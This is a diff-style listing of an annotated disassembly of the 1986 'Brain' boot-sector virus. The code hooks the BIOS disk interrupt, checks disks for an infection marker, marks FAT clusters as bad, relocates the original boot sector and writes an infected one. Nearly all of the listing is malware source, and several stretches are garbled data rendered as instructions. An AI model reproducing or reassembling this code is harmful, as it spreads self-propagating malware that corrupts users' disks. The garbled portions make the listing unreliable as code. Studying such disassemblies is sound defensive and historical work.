+MOV  AL,CL               ;<br>
+MUL  Byte Ptr [2BH]      ;<br>
+MOV  [29H],AL       ;<br>
+POP  AX             ;<br>
+MUL  Word Ptr [2BH]      ;<br>
+DIV  Word Ptr [SI+0DH]   ;(BPB.SECTORS PER TRACK)<br>
+INC  DL             ;<br>
+MOV  [28H],DL       ;<br>
+PUSH DX             ;<br>
+XOR  DX,DX               ;<br>
+DIV  Word Ptr [SI+0FH]   ;(BPB.NUMBER OF HEADS)<br>
+MOV  [21H],DL       ;<br>
+MOV  [26H],AX       ;<br>
+POP  DX             ;<br>
+RC_10:   MOV  CL,[29H]       ;<br>
+ADD  DL,CL               ;<br>
+MOV  AX,[SI+0DH]         ;(BPB.SECTORS PER TRACK)<br>
+INC  AX             ;<br>
+CMP  DL,AL               ;<br>
+JBE  RC_20               ;<br>
+SUB  AL,[28H]       ;<br>
+MOV  CL,AL               ;<br>
+RC_20:   MOV  AL,CL               ;<br>
+MOV  DX,[26H]       ;<br>
+MOV  CL,6           ;<br>
+SHL  DH,CL               ;<br>
+OR   DH,[28H]       ;<br>
+MOV  CX,DX               ;<br>
+XCHG CH,CL               ;<br>
+MOV  DX,[20H]       ;<br>
+;<br>
+MOV  AH,2           ;READ SECTOR<br>
+PUSH AX             ;<br>
+INT  13H            ;<br>
+POP  AX             ;<br>
+JB   ERROR_2             ;IF ERROR...'BOOT FAILURE'<br>
+SUB  [29H],AL       ;<br>
+JBE  RC_90               ;<br>
+CBW                 ;<br>
+MUL  Word Ptr [2DH]      ;<br>
+ADD  BX,AX               ;<br>
+INC  Byte Ptr [21H]      ;<br>
+MOV  DL,[21H]       ;<br>
+CMP  DL,[SI+0FH]         ;<br>
+MOV  DL,1           ;<br>
+MOV  [28H],DL       ;<br>
+JB   RC_10               ;<br>
+MOV  Byte Ptr [21H],0    ;<br>
+INC  Word Ptr [26H]      ;<br>
+JMP  RC_10               ;<br>
+;<br>
+RC_90:   POP  BX             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; PRINT BOOT ERROR MESSAGE AND WAIT FOR A KEY                   ;<br>
+;-----------------------------------------------------------------------;<br>
+ERROR_1:                ;0339<br>
+MOV  SI,01B3H       ;'Non-System disk'<br>
+JMP  E_10           ;<br>
+;<br>
+;---------------------------------------;<br>
+ERROR_2:                ;<br>
+MOV  SI,01C5H       ;'BOOT failure'<br>
+E_10:    CALL DISPLAY_STRING      ;<br>
+;<br>
+MOV  SI,01D4H       ;'Replace and press any key when ready'<br>
+CALL DISPLAY_STRING      ;<br>
+;<br>
+MOV  AH,0           ;WAIT FOR A KEY<br>
+INT  16H            ;<br>
+E_20:    MOV  AH,1           ;   THROW IT AWAY AND<br>
+INT  16H            ;   WAIT FOR ANOTHER ONE BUT<br>
+JNZ  E_20           ;   DONT GET IT<br>
+JMP  REBOOT              ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; DISPLAY ASCIIZ STRING                               ;<br>
+; ON ENTRY:   DS:SI = ASCIIZ STRING                        ;<br>
+;-----------------------------------------------------------------------;<br>
+DISPLAY_STRING:                   ;0357<br>
+DS_00:   LODSB                    ;DISPLAY UNTIL NULL<br>
+OR   AL,AL               ;<br>
+JZ   DS_90               ;<br>
+MOV  AH,0EH              ;<br>
+MOV  BX,7           ;<br>
+INT  10             ;<br>
+JMP  DS_00               ;<br>
+DS_90:   RET                 ;0365<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+UI:                     ;0366:<br>
+MOV  CL,01               ;<br>
+CALL READ_CLUSTER        ;<br>
+;<br>
+PUSH SI             ;<br>
+MOV  DI,BX               ;<br>
+MOV  AX,ES:[BX+1C]       ;<br>
+XOR  DX,DX               ;<br>
+DIV  Word Ptr [SI]       ;<br>
+INC  AL             ;<br>
+MOV  [002A],AL      ;<br>
+MOV  SI,019D             ;<br>
+MOV  CX,000B             ;<br>
+REPZ                ;<br>
+CMPSB                    ;<br>
+JNZ  ERROR_1             ;'NON SYSTEM DISK'<br>
+MOV  AX,ES:[BX+3A]       ;<br>
+MOV  [0022],AX      ;<br>
+MOV  DI,BX               ;<br>
+ADD  DI,+20              ;<br>
+MOV  SI,01A8             ;<br>
+MOV  CX,000B             ;<br>
+REPZ                ;<br>
+CMPSB                    ;<br>
+JNZ  ERROR_1             ;'NON SYSTEM DISK'<br>
+POP  SI             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L039D    DB   'IBMBIO  COM'<br>
+DB   'IBMDOS  COM'<br>
+DB   CR,LF,'Non-System disk',0<br>
+DB   CR,LF,'BOOT failure',0<br>
+DB   CR,LF,'Replace and press any key when ready',0<br>
+DB   90H,90H,90H,55H,0AAH<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L0400:   JMP  SHORT CONT_A        ;<br>
+;<br>
+DB   '&#169; 1986 Basit & Amjads (pvt) Ltd ',0<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+CONT_A:                      ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L0A5B    DB   'IBMBIO  COM'<br>
+DB   'IBMDOS  COM'<br>
+DB   CR,LF,'Non-System disk',0<br>
+DB   CR,LF,'BOOT failure',0<br>
+DB   CR,LF,'Replace and press any key when ready',0<br>
+DB   90H,90H,90H,55H,0AAH<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+ADD  AL,00               ;0425 0400<br>
+ADD  [06C6],CH      ;0427 002EC606<br>
+AND  AX,1F02             ;042B 25021F<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+REDIRECT_13:                 ;042E<br>
+XOR  AX,AX               ;GET INT 13 VECTOR<br>
+MOV  DS,AX               ;<br>
+MOV  AX,[004CH]          ;<br>
+MOV  [01B4H],AX          ;   (SAVE IT TO INT 6D VECTOR)<br>
+MOV  AX,[004EH]          ;<br>
+MOV  [01B6H],AX          ;<br>
+MOV  AX,0276H       ;SET INT 13 VECTOR<br>
+MOV  [004CH],AX          ;<br>
+MOV  AX,CS               ;<br>
+MOV  [004EH],AX          ;<br>
+;<br>
+MOV  CX,0004             ;RETRY = 4<br>
+XOR  AX,AX               ;<br>
+MOV  ES,AX               ;<br>
+L0450:   PUSH CX             ;<br>
+MOV  DH,CS:[0006]        ;DH = HEAD<br>
+MOV  DL,00               ;DRIVE A:<br>
+MOV  CX,CS:[0007]        ;CX = TRACK/SECTOR<br>
+MOV  AX,0201             ;READ 1 SECTOR<br>
+MOV  BX,7C00             ;ES:BX == DTA = 0000:7C00<br>
+INT  6DH            ;<br>
+JNB  L0470               ;<br>
+MOV  AH,00               ;RESET<br>
+INT  6DH            ;<br>
+POP  CX             ;TRY AGAIN<br>
+LOOP L0450               ;<br>
+INT  18H            ;LOAD BASIC<br>
+;<br>
+L0470:   JMP  0000:7C00      ;JUMP TO BOOT LOADER ?!?!<br>
+;<br>
+NOP                 ;0475 90<br>
+STI                 ;0476 FB<br>
+CMP  AH,02               ;0477 80FC02<br>
+JNZ  L0494               ;047A 7518<br>
+CMP  DL,02               ;047C 80FA02<br>
+JA   L0494               ;047F 7713<br>
+CMP  CH,00               ;0481 80FD00<br>
+JNZ  L048B               ;0484 7505<br>
+CMP  DH,00               ;0486 80FE00<br>
+JZ   L0497               ;0489 740C<br>
+L048B:   DEC  Byte Ptr CS:[0225]  ;048B 2EFE0E2502<br>
+JNZ  L0494               ;0490 7502<br>
+JMP  L0497               ;0492 EB03<br>
+L0494:   JMP  L053C               ;0494 E9A500<br>
+L0497:   MOV  Byte Ptr CS:[0227],00    ;0497 2EC606270200<br>
+MOV  Byte Ptr CS:[0225],04    ;049D 2EC606250204<br>
+PUSH AX             ;04A3 50<br>
+PUSH BX             ;04A4 53<br>
+PUSH CX             ;04A5 51<br>
+PUSH DX             ;04A6 52<br>
+MOV  CS:[0226],DL        ;04A7 2E88162602<br>
+MOV  CX,0004             ;04AC B90400<br>
+PUSH CX             ;04AF 51<br>
+MOV  AH,00               ;04B0 B400<br>
+INT  6D             ;04B2 CD6D<br>
+JB   ;04CB               ;04B4 7215<br>
+MOV  DH,00               ;04B6 B600<br>
+MOV  CX,0001             ;04B8 B90100<br>
+MOV  BX,06BE             ;04BB BBBE06<br>
+PUSH ES             ;04BE 06<br>
+MOV  AX,CS               ;04BF 8CC8<br>
+MOV  ES,AX               ;04C1 8EC0<br>
+MOV  AX,0201             ;04C3 B80102<br>
+INT  6D             ;04C6 CD6D<br>
+POP  ES             ;04C8 07<br>
+JNB  ;04D1               ;04C9 7306<br>
+POP  CX             ;04CB 59<br>
+LOOP ;04AF               ;04CC E2E1<br>
+JMP  ;04FF               ;04CE EB2F<br>
+NOP                 ;04D0 90<br>
+POP  CX             ;04D1 59<br>
+MOV  AX,CS:[06C2]        ;04D2 2EA1C206<br>
+CMP  AX,1234             ;04D6 3D3412<br>
+JNZ  ;04E3               ;04D9 7508<br>
+MOV  Byte Ptr CS:[0227],01    ;04DB 2EC606270201<br>
+JMP  ;0503               ;04E1 EB20<br>
+PUSH DS             ;04E3 1E<br>
+PUSH ES             ;04E4 06<br>
+MOV  AX,CS               ;04E5 8CC8<br>
+MOV  DS,AX               ;04E7 8ED8<br>
+MOV  ES,AX               ;04E9 8EC0<br>
+PUSH SI             ;04EB 56<br>
+CALL L0804               ;04EC E81503<br>
+JB   ;04FA               ;04EF 7209<br>
+MOV  Byte Ptr CS:[0227],02    ;04F1 2EC606270202<br>
+CALL L06B2               ;04F7 E8B801<br>
+POP  SI             ;04FA 5E<br>
+POP  ES             ;04FB 07<br>
+POP  DS             ;04FC 1F<br>
+JNB  ;0503               ;04FD 7304<br>
+MOV  AH,00               ;04FF B400<br>
+INT  6D             ;0501 CD6D<br>
+POP  DX             ;0503 5A<br>
+POP  CX             ;0504 59<br>
+POP  BX             ;0505 5B<br>
+POP  AX             ;0506 58<br>
+CMP  CX,+01              ;0507 83F901<br>
+JNZ  L053C               ;050A 7530<br>
+CMP  DH,00               ;050C 80FE00<br>
+JNZ  L053C               ;050F 752B<br>
+CMP  Byte Ptr CS:[0227],01    ;0511 2E803E270201<br>
+JNZ  ;052A               ;0517 7511<br>
+MOV  CX,CS:[06C5]        ;0519 2E8B0EC506<br>
+MOV  DX,CS:[06C3]        ;051E 2E8B16C306<br>
+MOV  DL,CS:[0226]        ;0523 2E8A162602<br>
+JMP  L053C               ;0528 EB12<br>
+CMP  Byte Ptr CS:[0227],02    ;052A 2E803E270202<br>
+JNZ  L053C               ;0530 750A<br>
+;<br>
+MOV  CX,CS:[0007]        ;CX = TRACK/SECTOR<br>
+MOV  DH,CS:[0006]        ;DH = HEAD<br>
+L053C:   INT  6DH            ;<br>
+RETF 2              ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L0541    DB   0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L0550:   JMP  CONTINUE_3          ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L0553    DW   3              ;<br>
+DB   ' &#169; 1986 Basit & Amjads (pvt) Ltd'<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+CONTINUE_3:                  ;0577<br>
+CALL READ_VERIFY         ;READ VERIFY<br>
+MOV  AX,[06BEH]          ;IF ??? == DOUBLD SIDED 9 SECTORS...<br>
+CMP  AX,0FFFDH      ;<br>
+JE   L0586               ;...CONTINUE<br>
+MOV  AL,3           ;ELSE RETURN ??? ERROR<br>
+STC                 ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+L0586:                       ;0586<br>
+MOV  CX,0037             ;<br>
+MOV  Word Ptr [0353],0000     ;<br>
+CALL ;05F8               ;058F E86600<br>
+CMP  AX,0000             ;0592 3D0000<br>
+JNZ  ;05A5               ;0595 750E<br>
+INC  Word Ptr [0353]          ;0597 FF065303<br>
+CMP  Word Ptr [0353],+03 ;059B 833E530303<br>
+JNZ  ;05AB               ;05A0 7509<br>
+JMP  ;05B6               ;05A2 EB12<br>
+NOP                 ;05A4 90<br>
+MOV  Word Ptr [0353],0000     ;05A5 C70653030000<br>
+INC  CX             ;05AB 41<br>
+CMP  CX,0163             ;05AC 81F96301<br>
+JNZ  ;058F               ;05B0 75DD<br>
+MOV  AL,01               ;05B2 B001<br>
+STC                 ;05B4 F9<br>
+RET                 ;05B5 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+MOV  DL,03               ;05B6 B203<br>
+CALL ;05CB               ;05B8 E81000<br>
+DEC  CX             ;05BB 49<br>
+DEC  DL             ;05BC FECA<br>
+JNZ  ;05B8               ;05BE 75F8<br>
+INC  CX             ;05C0 41<br>
+CALL CONVERT_1      ;CLUSTER TO TRACK/SECTOR/HEAD<br>
+CALL ;062D               ;05C4 E86600<br>
+MOV  AL,00               ;05C7 B000<br>
+CLC                 ;05C9 F8<br>
+RET                 ;05CA C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+PUSH CX             ;05CB 51<br>
+PUSH DX             ;05CC 52<br>
+MOV  SI,06BE             ;05CD BEBE06<br>
+MOV  AL,CL               ;05D0 8AC1<br>
+SHR  AL,1           ;05D2 D0E8<br>
+JB   ;05E4               ;05D4 720E<br>
+CALL FUNCTION_1          ;BX = (CX*3)/2<br>
+MOV  AX,[BX+SI]          ;05D9 8B00<br>
+AND  AX,F000             ;05DB 2500F0<br>
+OR   AX,0FF7             ;05DE 0DF70F<br>
+JMP  ;05EF               ;05E1 EB0C<br>
+NOP                 ;05E3 90<br>
+CALL FUNCTION_1          ;BX = (CX*3)/2<br>
+MOV  AX,[BX+SI]          ;05E7 8B00<br>
+AND  AX,000F             ;05E9 250F00<br>
+OR   AX,FF70             ;05EC 0D70FF<br>
+MOV  [BX+SI],AX          ;05EF 8900<br>
+MOV  [BX+SI+0400],AX          ;05F1 89800004<br>
+POP  DX             ;05F5 5A<br>
+POP  CX             ;05F6 59<br>
+RET                 ;05F7 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+PUSH CX             ;05F8 51<br>
+MOV  SI,06BE             ;05F9 BEBE06<br>
+MOV  AL,CL               ;05FC 8AC1<br>
+SHR  AL,1           ;05FE D0E8<br>
+JB   L060D               ;0600 720B<br>
+CALL FUNCTION_1          ;BX = (CX*3)/2<br>
+MOV  AX,[BX+SI]          ;0605 8B00<br>
+AND  AX,0FFF             ;0607 25FF0F<br>
+JMP  L0619               ;060A EB0D<br>
+;<br>
+L060D:   CALL FUNCTION_1          ;BX = (CX*3)/2<br>
+MOV  AX,[BX+SI]          ;0610 8B00<br>
+AND  AX,FFF0             ;0612 25F0FF<br>
+MOV  CL,04               ;0615 B104<br>
+SHR  AX,CL               ;0617 D3E8<br>
+L0619:   POP  CX             ;0619 59<br>
+RET                 ;061A C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; BX = (CX*3)/2                                       ;<br>
+;-----------------------------------------------------------------------;<br>
+FUNCTION_1:                  ;061B<br>
+PUSH DX             ;<br>
+MOV  AX,3           ;<br>
+MUL  CX             ;<br>
+SHR  AX,1           ;<br>
+MOV  BX,AX               ;<br>
+POP  DX             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+READ_VERIFY:                 ;0627<br>
+MOV  AH,2           ;<br>
+CALL VERIFY_SECTORS      ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+WRITE_VERIFY:                ;062D<br>
+MOV  AH,03               ;<br>
+CALL VERIFY_SECTORS      ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+VERIFY_SECTORS:                   ;0633<br>
+MOV  CX,4           ;RETRY = 4<br>
+L0636:   PUSH CX             ;<br>
+PUSH AX             ;<br>
+MOV  AH,0           ;REST<br>
+INT  6DH            ;<br>
+POP  AX             ;<br>
+JB   L0653               ;<br>
+MOV  BX,offset L06BEH    ;<br>
+MOV  AL,4           ;4==VERIFY<br>
+MOV  DH,00               ;HEAD 0<br>
+MOV  DL,[0226]      ;DRIVE DL<br>
+MOV  CX,0002             ;TRACK 0/SECTOR 2<br>
+PUSH AX             ;<br>
+INT  6DH            ;<br>
+POP  AX             ;<br>
+JNB  L065C               ;IF ERROR...EXIT<br>
+L0653:   POP  CX             ;<br>
+LOOP L0636               ;RETRY<br>
+POP  AX             ;<br>
+POP  AX             ;<br>
+MOV  AL,2           ;BAD ADDRESS MARK ???<br>
+STC                 ;RETURN ERROR<br>
+RET                 ;<br>
+;<br>
+L065C:   POP  CX             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; CONVERT CLUSTERS TO TRACK/SECTOR/HEAD ????                    ;<br>
+;-----------------------------------------------------------------------;<br>
+CONVERT_1:                   ;065E<br>
+PUSH CX             ;<br>
+SUB  CX,2           ;<br>
+SHL  CX,1           ;WORD PTR<br>
+ADD  CX,9*2              ;   (SECTORS PER CYLINDER ???)<br>
+MOV  AX,CX               ;<br>
+MOV  CL,9*2              ;   (SECTORS PER CYLINDER ???)<br>
+DIV  CL             ;<br>
+MOV  DS:[0008],AL        ;AL = TRACK<br>
+MOV  Byte Ptr DS:[0006],0     ;INC. HEAD<br>
+INC  AH             ;INC. SECTOR<br>
+CMP  AH,9           ;IF TOO BIG...<br>
+JBE  L0684               ;<br>
+SUB  AH,9           ;...START AT ZERO<br>
+MOV  Byte Ptr DS:[0006],1     ;INC. HEAD<br>
+L0684:   MOV  DS:[0007],AH        ;<br>
+POP  CX             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+ADD  [BX+SI],AL          ;068A 0000<br>
+ADD  [BX+SI],AL          ;068C 0000<br>
+ADD  [BX+SI],AL          ;068E 0000<br>
+ADD  BP,[SI+00]          ;0690 036C00<br>
+ADD  AX,[BP+DI]          ;0693 0303<br>
+MOV  SI,010E             ;0695 BE0E01<br>
+ADD  [BX+SI],AL          ;0698 0000<br>
+ADD  AX,SP               ;069A 01E0<br>
+FCOMP     DWord Ptr [DI+E0D7] ;069C D89DD7E0<br>
+LAHF                ;06A0 9F<br>
+LEA  BX,[BX+SI+8E9F]          ;06A1 8D989F8E<br>
+LOOPNZ    ;06C7               ;06A5 E020<br>
+SUB  [BP+DI+29],AH       ;06A7 286329<br>
+AND  [BP+SI+72],AL       ;06AA 204272<br>
+POPA                ;06AD 61<br>
+IMUL BP,[BP+20],E824          ;06AE 696E2024E8<br>
+FILD DWord Ptr [BX+SI]   ;06B3 DB00<br>
+JB   L06C1               ;06B5 720A<br>
+PUSH DI             ;06B7 57<br>
+CALL ;06DA               ;06B8 E81F00<br>
+POP  DI             ;06BB 5F<br>
+JB   L06C1               ;06BC 7203<br>
+CALL WRITE_RBF      ;WRITE ROOT BOOT FAT<br>
+L06C1:   RET                 ;06C1 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+MOV  BX,049B             ;06C2 BB9B04<br>
+MOV  CX,000B             ;<br>
+L06C8:   MOV  AL,[BX]             ;<br>
+NEG  AL             ;<br>
+MOV  [SI],AL             ;<br>
+INC  SI             ;<br>
+INC  BX             ;<br>
+LOOP L06C8               ;<br>
+;<br>
+MOV  AL,08               ;<br>
+MOV  [SI],AL             ;<br>
+CLC                 ;<br>
+RET                 ;06D7 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+MOV  Byte Ptr [06C7],91  ;06D8 C606C70691<br>
+ADD  AL,6C               ;06DD 046C<br>
+ADD  [BP+06FE],BH        ;06DF 00BEFE06<br>
+MOV  [0493],DX      ;06E3 89169304<br>
+MOV  AX,[0491]      ;06E7 A19104<br>
+SHR  AX,1           ;06EA D1E8<br>
+MOV  [0497],AX      ;06EC A39704<br>
+SHR  AX,1           ;06EF D1E8<br>
+MOV  [0495],AX      ;06F1 A39504<br>
+XCHG AX,CX               ;06F4 91<br>
+AND  CL,43               ;06F5 80E143<br>
+MOV  DI,[0495]      ;06F8 8B3E9504<br>
+ADD  DI,01E3             ;06FC 81C7E301<br>
+MOV  AL,[SI]             ;0700 8A04<br>
+CMP  AL,00               ;0702 3C00<br>
+JZ   ;071B               ;0704 7415<br>
+MOV  AL,[SI+0B]          ;0706 8A440B<br>
+AND  AL,08               ;0709 2408<br>
+CMP  AL,08               ;070B 3C08<br>
+JZ   ;071B               ;070D 740C<br>
+ADD  SI,+20              ;070F 83C620<br>
+DEC  Word Ptr [0491]          ;0712 FF0E9104<br>
+JNZ  ;0700               ;0716 75E8<br>
+STC                 ;0718 F9<br>
+RET                 ;0719 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+:                       ;071A<br>
+MOV  CX,[BP+DI+331D]          ;<br>
+PUSH DS             ;071E 1E<br>
+XCHG AX,DI               ;071F 97<br>
+ADD  AL,89               ;0720 0489<br>
+XCHG AX,DI               ;0722 3697<br>
+ADD  AL,FA               ;0724 04FA<br>
+MOV  AX,SS               ;0726 8CD0<br>
+MOV  SS:[0493],AX        ;0728 A39304<br>
+MOV  [0495],SP      ;072B 89269504<br>
+MOV  AX,CS               ;072F 8CC8<br>
+MOV  SS,AX               ;0731 8ED0<br>
+MOV  SP,[0497]      ;0733 8B269704<br>
+ADD  SP,+0C              ;0737 83C40C<br>
+MOV  CL,51               ;073A B151<br>
+ADD  DX,444C             ;073C 81C24C44<br>
+MOV  DI,2555             ;0740 BF5525<br>
+MOV  CX,0C03             ;0743 B9030C<br>
+REPZ                ;0746 F3<br>
+CMPSW                    ;0747 A7<br>
+MOV  AX,0B46             ;0748 B8460B<br>
+MOV  CX,0003             ;074B B90300<br>
+ROL  AX,CL               ;074E D3C0<br>
+MOV  [0497],AX      ;0750 A39704<br>
+MOV  CX,0005             ;0753 B90500<br>
+MOV  DX,0008             ;0756 BA0800<br>
+SUB  Word Ptr [0497],5210     ;0759 812E97041052<br>
+PUSH [0497]              ;075F FF369704<br>
+L0763:   MOV  AH,[BX]             ;0763 8A27<br>
+INC  BX             ;0765 43<br>
+MOV  DL,AH               ;0766 8AD4<br>
+SHL  DL,1           ;0768 D0E2<br>
+JB   L0763               ;076A 72F7<br>
+L076C:   MOV  DL,[BX]             ;076C 8A17<br>
+INC  BX             ;076E 43<br>
+MOV  AL,DL               ;076F 8AC2<br>
+SHL  DL,1           ;0771 D0E2<br>
+JB   L076C               ;0773 72F7<br>
+ADD  AX,1D1D             ;0775 051D1D<br>
+PUSH AX             ;0778 50<br>
+INC  Word Ptr [0497]          ;0779 FF069704<br>
+JNB  L0780               ;077D 7301<br>
+JMP  268B:E1E2      ;077F EAE2E18B26<br>
+;<br>
+XCHG AX,BP               ;0784 95<br>
+ADD  AL,A1               ;0785 04A1<br>
+XCHG AX,BX               ;0787 93<br>
+ADD  AL,8E               ;0788 048E<br>
+SAR  BL,1           ;078A D0FB<br>
+ADD  DH,[BP+SI]          ;078C 0232<br>
+CLC                 ;078E F8<br>
+RET                 ;078F C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; READ ROOT, BOOT, FIRST FAT                          ;<br>
+;-----------------------------------------------------------------------;<br>
+READ_RBF:                    ;0790<br>
+MOV  Byte Ptr [0490],02  ;COMMAND = READ<br>
+JMP  ROOT_BOOT_FAT       ;DO IT<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; WRITE ROOT, BOOT, FIRST FAT                              ;<br>
+;-----------------------------------------------------------------------;<br>
+WRITE_RBF:                   ;0798<br>
+MOV  Byte Ptr [0490],03  ;COMMAND = WRITE<br>
+JMP  ROOT_BOOT_FAT       ;DO IT<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; READ OR WRITE ROOT, BOOT, FIRST FAT                      ;<br>
+;-----------------------------------------------------------------------;<br>
+ROOT_BOOT_FAT:                    ;07A0<br>
+MOV  DH,0           ;HEAD = 0<br>
+MOV  DL,[226H]      ;DL = DRIVE<br>
+MOV  CX,6           ;(TRACK 0/SECTOR 6) == ENTIRE ROOT DIR<br>
+MOV  AH,[490H]      ;AH = COMMAND<br>
+MOV  AL,4           ;4 SECTORS<br>
+MOV  BX,6BEH             ;ES:BX = DTA<br>
+CALL RESET_DO_IT         ;GO TO DISK<br>
+JB   L07C9               ;IF ERROR...EXIT<br>
+;<br>
+MOV  CX,1           ;(TRACK 0/SECTOR 1) == BOOT & FAT1<br>
+MOV  DH,1           ;HEAD 1<br>
+MOV  AH,[490H]      ;AH = COMMAND<br>
+MOV  AL,3           ;3 SECTORS<br>
+ADD  BX,800H             ;ES:BX = DTA<br>
+CALL RESET_DO_IT         ;GO TO DISK<br>
+L07C9:   RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; RESET DRIVE BEFORE DOING SPECIFIED FUNCTION                   ;<br>
+;-----------------------------------------------------------------------;<br>
+RESET_DO_IT:                 ;07CA<br>
+MOV  [0493],AX      ;<br>
+MOV  [0495],BX      ;SAVE REGs<br>
+MOV  [0497],CX      ;<br>
+MOV  [0499],DX      ;<br>
+MOV  CX,0004             ;RETRY COUNT = 4<br>
+;<br>
+RDI_10:  PUSH CX             ;<br>
+MOV  AH,00               ;REST DRIVE<br>
+INT  6D             ;<br>
+JB   RDI_80              ;IF ERROR...RETRY<br>
+MOV  AX,[0493]      ;RESTORE REGs<br>
+MOV  BX,[0495]      ;<br>
+MOV  CX,[0497]      ;<br>
+MOV  DX,[0499]      ;<br>
+INT  6D             ;DO SPECIFIED FUNCTION<br>
+JNB  RDI_90              ;IF NO ERROR...EXIT<br>
+RDI_80:  POP  CX             ;<br>
+LOOP RDI_10              ;RETRY<br>
+STC                 ;RETURN ERROR<br>
+RET                 ;<br>
+;<br>
+RDI_90:  POP  CX             ;RETURN NO ERROR<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+ADD  [BX+SI],AL          ;07FD 0000<br>
+ADD  [BP+DI],AL          ;07FF 0003<br>
+ADD  [BX+DI],AL          ;0801 0001<br>
+<br>
+L0804: ?!?!<br>
+<br>
+<br>
+<br>
+ADD  BP,AX               ;0803 03E8<br>
+DEC  CX             ;0805 49<br>
+STD                 ;0806 FD<br>
+JB   ;085D               ;0807 7254<br>
+;<br>
+MOV  Word Ptr [000A],0001     ;<br>
+MOV  Byte Ptr [0009],00  ;<br>
+MOV  BX,06BE             ;ES:BX = DTA ?<br>
+CALL READ_SECTORS        ;<br>
+;<br>
+MOV  BX,06BE             ;BX = DTA<br>
+MOV  AX,[0007]      ;GET SECTOR TRACK<br>
+MOV  [000A],AX      ;SAVE SECTOR/TRACK<br>
+MOV  AH,[0006]      ;GET HEAD<br>
+MOV  [0009],AH      ;SAVE HEAD<br>
+CALL WRITE_SECTORS       ;WRITE SECTOR(S)<br>
+CALL NEXT_SECTOR         ;POINT TO NEXT<br>
+;<br>
+MOV  CX,0005             ;CX = ???<br>
+MOV  BX,0200             ;BX = DTA<br>
+L0837:   MOV  [0600],CX      ;SAVE ???<br>
+CALL WRITE_SECTORS       ;WRITE SECTOR(S)<br>
+CALL NEXT_SECTOR         ;POINT TO NEXT<br>
+ADD  BX,512              ;DTA += 512<br>
+MOV  CX,[0600]      ;???<br>
+LOOP L0837               ;LOOP 5 TIMES ???<br>
+;<br>
+MOV  Byte Ptr [0009],00  ;HEAD = 0<br>
+MOV  Word Ptr [000A],0001     ;TRACK/SECTOR = 0/1<br>
+MOV  BX,0000             ;DTA = INFECTED BOOT SECTOR<br>
+CALL WRITE_SECTORS       ;WRITE INFECTED BOOT SECTOR<br>
+CLC                 ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+READ_SECTORS:                ;085E<br>
+MOV  Word Ptr [0602H],0201H   ;READ CMD/1 SECTOR<br>
+JMP  DO_SECTORS          ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+WRITE_SECTORS:                    ;0867<br>
+MOV  Word Ptr [0602H],0301H   ;WRITE CMD/1 SECTOR<br>
+JMP  DO_SECTORS          ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; READ OR WRITE SOME SECTORS WITH A RETRY COUNT OF 4            ;<br>
+;                                           ;<br>
+; ON ENTRY:   DS:[601H] = COMMAND                     ;<br>
+;        DS:[602H] = SECTOR COUNT                ;<br>
